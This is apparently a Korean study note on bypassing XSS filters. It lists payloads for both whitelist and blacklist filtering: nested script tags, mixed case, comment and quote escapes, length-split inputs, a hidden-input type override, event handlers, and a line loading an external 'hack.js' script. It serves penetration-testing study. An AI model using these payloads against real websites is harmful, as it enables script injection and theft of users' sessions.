# Anti XSS Bypass

Anti XSS는 XSS를 막기 위해 서버에서 설정해놓은 Black List, White List 기반 필터링이다.

Anti XSS Bypass는 우회하는 것을 목적으로 두고 있다.

# White List 필터링 우회 방법

허용해야 할 태그, 속성을 제외한 나머지 모든 문자열에 대해서 필터링하는 방법이다.   
대체로 XSS에 대한 권고 시 가장 추천하는 방식이며   
대체로 게시판과 같이 특수문자를 필터링할 수 없어 태그, 속성에 대해 필터링할 때 사용된다.
</br>
</br>

script 태그 필터링
```
Input: <script>alert(1)</script>
Ouput: alert(1)
```
```
Input: <scr<script>ipt>alert(1)</scr<script>ipt>
Ouput: <script>alert(1)</script>
```
</br>

주석 필터링   
(javascript 내에 XSS가 들어간 상황)   
```
Input: ";alert(1);//
Output: run="alert(1)";
```
```
Input: "+alert(1)+prompt("
Output: run=""+alert(1)+run="";
```
</br>
</br>

# Black List 필터링 우회 방법

White List 필터링과는 반대로 지정한 태그, 속성, 특수문자 등에 대해서만 필터링을 하는 방법이다.   
White List에 비해 취약점은 많지만   
검색기능과 같이 특수문자가 일반적이지 않은 구간에서는    
서비스의 성능과 개발 리소스를 고려했을 때 나쁘지 않은 선택이다.   
주로 특수문자 필터링 시 사용되는 방법이며 게시판과 같이 특수문자를 필터링할 수 없는 상황에서   
많은 우회 상황을 만들어낸다.
</br>
</br>

0.번호 지정하기
```
<script>alert(1)</script>
<iframe src=javascript:alert(2)></iframe>
<img src="z" onerror="alert(3)">
<input autofocus onfocus="alert(4)">
```
이런 식으로 번호를 지정해놓으면 어디에서 발생했는지 쉽게 알 수 있다.
</br>
</br>

1.Client Side 검증 우회   
```
Burp Suite (프록시 툴) 이용.  

그러면 client 에서 < > %ltm %rt 이런 식으로 바꿔도 프록시 툴로 우회 가능
```
</br>

2.Script Load   
", ', alert function
```
<script scr=http://yws.com/hack.js></script>

alert 1은 띄울 수 있는데, 길이 제한이 걸렸을 떄 사용함.
```
</br>

3.대소문자 혼용   
```
Filter: 구문 필터링
Case
Input : <script>alert(1)</script>
Output: <!-- Not Allowed -->

Attack
Input : <ScRipT>alert(1)</scRipT>
Output: <ScRipT>alert(1)</scRipT>

대소문자를 혼용하여 사용함으로 우회
```
</br>

4.공백으로 필터링 되는 문자   
```
Filter: Tag -> Blank
Case
Input : <script>alert(1)</script>
Output: alert(1)

Attack
Input : <scr<script>ipt>alert(1)</scr<script>ipt>
Output: <script>alert(1)</script>

특정 문자를 공백으로 필터링한다면 2개의 필터링 문자를 결합하여 우회
```
</br>

5.공격코드 필터링
```
Filter: 구문 필터링
Case
Input : <script>alert(1)</script>
Output: <!-- Not Allowed -->

Attack
Input : <script>prompt`1`</script>
Output: <script>prompt`1`</script>
```
</br>

6.길이제한
```
Filter: Length
Case
Input : <script>alert(1)</script>
Output: <script>alert(

Attack
Input1: <script>/*
Input2: */alert(1);/*
Input3: */</scrpit>
Output: <script>/*
asfdasdfasfasf
asfasdfasf
*/alert(1)/*
asdfasdfasf
asdfasfd*/</script>
```
</br>

7.주석처리
```
Filter: 주석으로 처리
Case
Input : <script>alert(1)</script>
Output: <!-- Not Allowed Tag :: <script>alert(1)</script> -->

Attack
Input : --><script>alert(1)</script>
Output: <!-- Not Allowed Tag :: --><script>alert(1)</script> -->
```
</br>

8.Hidden
```
Filter: 구문 필터링(Hidden 속성)
Case
Input : " onerror=alert(1) z="
Output: <input value="" onerror=alert(1) z="" type="hidden">

Attack
Input : " type="text" onerror=alert(1) z="
Output: <input value="" type="text" onerror=alert(1) z="" type="hidden">
```
</br>

9.구문 필터링
```
Filter: 구문 필터링
Case
Input : " onerror=alert(1) z="
Output: <input value="&quot onerror=alert(1) z=&quot">

Attack
Input : \" onerror=alert(1)
Output: <input value="\" onerror=alert(1) ="">
```
</br>

10.EventHandler   
javascript 넣을 수 있음.   
```
1. onerror   
   ex) <img src=x onerror="alert(1)">
2. onactivate
3. onload  
4. svg    
5. onmouseover   
등등등   
```

근데 아는 게 다 필터링 되어있다면?   


[XSS CheatSheet]   
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet